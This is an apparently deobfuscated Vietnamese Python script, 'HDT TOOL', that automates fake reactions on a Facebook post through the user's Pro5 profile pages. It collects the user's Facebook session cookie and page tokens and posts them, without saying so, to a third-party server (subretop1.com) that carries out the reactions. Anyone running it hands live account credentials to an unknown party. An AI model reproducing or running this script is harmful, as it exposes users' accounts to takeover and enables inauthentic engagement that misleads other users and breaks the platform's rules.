#Deobfuscate by HuyAnh
#Zalo:0905491417
#huyanhnong.21

from builtins import exec,input,len,print,int,range,str,exit
exec('')
luc='[1;32m'
trang='[1;37m'
do='[1;31m'
vang='[0;93m'
hong='[1;35m'
xduong='[1;34m'
xnhac='[1;36m'
lamtilo=trang+'['+do+'⟨⟩'+trang+'] '+trang+'➩ '
lam='<=>'
dem=0
listcx1=[]
listcx=[]
list_page_pro5=[]
import os,sys,requests,threading
from time import sleep
from datetime import datetime
from time import strftime
def echo(a):
   for i in range(len(a)):
     sys.stdout.write(a[i])
     sys.stdout.flush()
     sleep(0.00)
   print()
def banner():
    trang='[1;37m'
    xanh_la='[1;32m'
    xanh_duong='[1;34m'
    do='[1;31m'
    vang='[1;33m'
    tim='[1;35m'
    dac_biet='[32;5;245m[1m[38;5;39m'
    banner=(f"""
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩ \033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;32m             ██╗  ██╗██████╗ ████████╗          
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;31m             ██║  ██║██╔══██╗╚══██╔══╝          
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;33m             ███████║██║  ██║   ██║             
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;36m             ██╔══██║██║  ██║   ██║             
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;34m             ██║  ██║██████╔╝   ██║             
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;30m             ╚═╝  ╚═╝╚═════╝    ╚═╝             
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩                                   
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;32m         ████████╗ ██████╗  ██████╗ ██╗     
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;31m         ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;33m            ██║   ██║   ██║██║   ██║██║     
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;36m            ██║   ██║   ██║██║   ██║██║     
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;34m            ██║   ╚██████╔╝╚██████╔╝███████╗
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩\033[1;30m            ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩ \033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩ ⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩ \033[1;31mTOOL BUFF CẢM XÚC BÀI VIẾT BẰNG PRO5 
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩ \033[1;32mADMIN:\033[1;36m 🌺 HDT -TOOL 🌺
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩ \033[1;34mNHÓM ZALO: \033[1;33m https://zalo.me/g/bprmyn080
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩ YOUTUBE:\033[1;35m https://youtube.com/@HDTTOOL
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩ WEB:\033[1;36m linkbio.co/hdttool
\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩ ⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦\n""")
    echo(banner)
def clear():
    os.system('cls' if os.name=='nt' else 'clear')
def thanh():
    print('\033[1;31m[\033[1;32m⟨⟩\033[1;31m]\033[1;33m ➩ ⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦⏦')
import uuid
try:
    import requests
except:
    print(luc+'Bạn Chưa Tải Thư Viện \n Bắt Đầu Tải... ')
    os.system('pip install requests')
def lam_delay(o):
    while(o>1):
        o=o-1
        print(f'{trang}[\033[1;31mH\033[1;33mD\033[1;36mT \033[1;35m- \033[1;34mT\033[1;32mO\033[1;35mO\033[1;34mL\033[1;37m]\033[1;37m[\033[1;36m|\033[1;37m]\033[1;37m[.....]\033[1;37m[{o}]',end='\r');sleep(1/6)
        print(f'{trang}[\033[1;31mH\033[1;33mD\033[1;36mT \033[1;35m- \033[1;34mT\033[1;32mO\033[1;35mO\033[1;34mL\033[1;37m]\033[1;37m[\033[1;31m/\033[1;37m]\033[1;37m[\033[1;32m>\033[1;37m....]\033[1;37m[{o}]',end='\r');sleep(1/6)
        print(f'{trang}[\033[1;31mH\033[1;33mD\033[1;36mT \033[1;35m- \033[1;34mT\033[1;32mO\033[1;35mO\033[1;34mL\033[1;37m]\033[1;37m[\033[1;32m-\033[1;37m]\033[1;37m[\033[1;32m>\033[1;31m>\033[1;37m...]\033[1;37m[{o}]',end='\r');sleep(1/6)
        print(f'{trang}[\033[1;31mH\033[1;33mD\033[1;36mT \033[1;35m- \033[1;34mT\033[1;32mO\033[1;35mO\033[1;34mL\033[1;37m]\033[1;37m[\033[1;33m+\033[1;37m]\033[1;37m[\033[1;32m>\033[1;31m>\033[1;36m>\033[1;37m..]\033[1;37m[{o}]',end='\r');sleep(1/6)
        print(f'{trang}[\033[1;31mH\033[1;33mD\033[1;36mT \033[1;35m- \033[1;34mT\033[1;32mO\033[1;35mO\033[1;34mL\033[1;37m]\033[1;37m[\033[1;34m\{trang}]\033[1;37m[\033[1;32m>\033[1;31m>\033[1;36m>\033[1;33m>\033[1;37m.]\033[1;37m[{o}]',end='\r');sleep(1/6)
        print(f'{trang}[\033[1;31mH\033[1;33mD\033[1;36mT \033[1;35m- \033[1;34mT\033[1;32mO\033[1;35mO\033[1;34mL\033[1;37m]\033[1;37m[\033[1;35m|\033[1;37m]\033[1;37m[\033[1;32m>\033[1;31m>\033[1;36m>\033[1;33m>\033[1;35m>\033[1;37m]\033[1;37m[{o}]',end='\r');sleep(1/6)
def tangcxstr(x,dem,linkpost,idpost):
    camxuc=listcx[0]
    reac=listcx1[0]
    time=datetime.now().strftime('%H:%M:%S')
    uid_page=list_page_pro5[x].split('|')[0]
    name_page=list_page_pro5[x].split('|')[1]
    list1=(f'i_user={uid_page};')
    uuid1=uuid.uuid4()
    cookie9=(f'{cookie}{list1}')
    data22={'cookie9':cookie9,
      'linkpost':linkpost,
}
    feedback_id=requests.post('https://subretop1.com/toolfb/cx1.php',data=data22).json()['msg']
    data1={
        'fb_dtsg':fb_dtsg,
        'jazoest':jazoest,
       'cookie9':cookie9,
        'reac':reac,
        'uid_page':uid_page,
        'linkpost':linkpost,
        'feedback_id':feedback_id,
        'uuid1':uuid1,
}
    runtanglikestr1=requests.post('https://subretop1.com/toolfb/cx2.php',data=data1).json()['msg']
    if 'data' in runtanglikestr1:
        print('[1;31m[[0;93m'+str(dem)+'[1;31m] | [1;36m'+str(time)+' [1;31m| [0;93mTăng Thành Công [1;31m| [1;37m'+str(camxuc)+' [1;31m| [1;37m'+str(idpost)+' Với ID PRO5: [1;31m| [1;34m'+str(uid_page)+' [1;31m|Tên Pro5: [1;35m'+str(name_page)+'  ')
    else:
        print('[1;31mTăng Cảm Xúc Thất Bại, Có Vẻ ACC Bạn Đã Bị Block!!')
clear()
banner()
cookie=input(lamtilo+luc+'Vui Lòng Nhập Cookie Chứa Page Pro5'+trang+': '+vang)
headers={
        'authority':'mbasic.facebook.com',
        'cache-control':'max-age=0',
        'sec-ch-ua':'"Google Chrome";v="93", " Not;A Brand";v="99", "Chromium";v="93"',
        'sec-ch-ua-mobile':'?0',
        'sec-ch-ua-platform':'"Windows"',
        'upgrade-insecure-requests':'1',
        'origin':'https://mbasic.facebook.com',
        'content-type':'application/x-www-form-urlencoded',
        'user-agent':'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
        'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site':'same-origin',
        'sec-fetch-mode':'navigate',
        'sec-fetch-user':'?1',
        'sec-fetch-dest':'document',
        'referer':'https://mbasic.facebook.com/',
        'accept-language':'en-US,en;q=0.9',
        'cookie':cookie,
}
try:
    print(lamtilo+xnhac+'Đang Check Live Cookie...',end='\r')
    find_data=requests.get('https://mbasic.facebook.com/',headers=headers).text
    fb_dtsg=find_data.split('<input type="hidden" name="fb_dtsg" value="')[1].split('"')[0]
    jazoest=find_data.split('<input type="hidden" name="jazoest" value="')[1].split('"')[0]
except:
    exit(lamtilo+do+'Cookie Die Vui Lòng Kiểm Tra Lại!!!')
headers_getid={
    'cookie':cookie,
}
data={
    'fb_dtsg':fb_dtsg,
    'jazoest':jazoest,
    'variables':'{"showUpdatedLaunchpointRedesign":true,"useAdminedPagesForActingAccount":false,"useNewPagesYouManage":true}',
    'doc_id':'5300338636681652'
}
getidpro5=requests.post('https://www.facebook.com/api/graphql/',headers=headers_getid,data=data).json()['data']['viewer']['actor']['profile_switcher_eligible_profiles']['nodes']
for i in getidpro5:
    uid_page=i['profile']['id']
    name_page=i['profile']['name']
    gomlist=(f'{uid_page}|{name_page}')
    list_page_pro5.append(gomlist)
clear()
banner()
print(lamtilo+luc+'GET THÀNH CÔNG'+trang+': '+str(len(list_page_pro5))+luc+' Page Pro5')
thanh()
linkpost=input(lamtilo+luc+'Vui Lòng Nhập Link Bài Viết'+trang+': '+vang)
headers2={
        'Authority':'id.traodoisub.com',
         'Accept':'application/json, text/javascript, */*; q=0.01',
         'Accept-Language':'vi,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
         'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
         'Origin':'https://id.traodoisub.com',
         'Referer':'https://id.traodoisub.com/',
         'Sec-Ch-Ua':'"Chromium";v="106", "Microsoft Edge";v="106", "Not;A=Brand";v="99"',
         'Sec-Ch-Ua-Mobile':'?0',
         'Sec-Ch-Ua-Platform':'"Windows"',
         'Sec-Fetch-Dest':'empty',
         'Sec-Fetch-Mode':'cors',
         'Sec-Fetch-Site':'same-origin',
         'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.37',
         'X-Requested-With':'XMLHttpRequest',
}
data2={
    'link':linkpost
}
idpost=requests.post('https://id.traodoisub.com/api.php',headers=headers2,data=data2).json()['id']
thanh()
print(lamtilo+do+'['+vang+'GET ID THÀNH CÔNG'+do+']'+trang+': '+xnhac+'ID BÀI VIẾT CỦA BẠN LÀ'+trang+': '+trang+str(idpost)+'')
thanh()
print(lamtilo+luc+'Nhập Số '+do+'['+vang+'1'+do+'] '+luc+'Để Tăng Cảm Xúc '+trang+'Like')
print(lamtilo+luc+'Nhập Số '+do+'['+vang+'2'+do+'] '+luc+'Để Tăng Cảm Xúc '+trang+'Love')
print(lamtilo+luc+'Nhập Số '+do+'['+vang+'3'+do+'] '+luc+'Để Tăng Cảm Xúc '+trang+'Care')
print(lamtilo+luc+'Nhập Số '+do+'['+vang+'4'+do+'] '+luc+'Để Tăng Cảm Xúc '+trang+'Haha')
print(lamtilo+luc+'Nhập Số '+do+'['+vang+'5'+do+'] '+luc+'Để Tăng Cảm Xúc '+trang+'Wow')
print(lamtilo+luc+'Nhập Số '+do+'['+vang+'6'+do+'] '+luc+'Để Tăng Cảm Xúc '+trang+'Sad')
print(lamtilo+luc+'Nhập Số '+do+'['+vang+'7'+do+'] '+luc+'Để Tăng Cảm Xúc '+trang+'Angry')
thanh()
cx=str(input(lamtilo+luc+'Vui Lòng Nhập Lựa Chọn'+trang+': '+vang))
if '1' in cx:
    listcx.append('👍')
    listcx1.append('1635855486666999')
if '2' in cx:
    listcx.append('❤️')
    listcx1.append('1678524932434102')
if '3' in cx:
    listcx.append('🤗')
    listcx1.append('613557422527858')
if '4' in cx:
    listcx.append('😆')
    listcx1.append('115940658764963')
if '5' in cx:
    listcx.append('😮')
    listcx1.append('478547315650144')
if '6' in cx:
    listcx.append('😢')
    listcx1.append('908563459236466')
if '7' in cx:
    listcx.append('😡')
    listcx1.append('444813342392137')
thanh()
soluongcx=int(input(lamtilo+luc+'Nhập Số Lượng Cảm Xúc Cần Tăng'+trang+': '+vang))
thanh()
delay=int(input(lamtilo+luc+'Vui Lòng Nhập Delay Tăng Cảm Xúc'+trang+': '+vang))
thanh()
while True:
    for x in range(int(len(list_page_pro5))):
        dem=dem+1
        threading.Thread(target=tangcxstr,args=(x,dem,linkpost,idpost,)).start()
        lam_delay(delay)
        if dem==soluongcx:
            thanh()
            exit(lamtilo+xnhac+'Đã Hoàn Thành '+trang+str(soluongcx)+xnhac+' Cảm Xúc ')
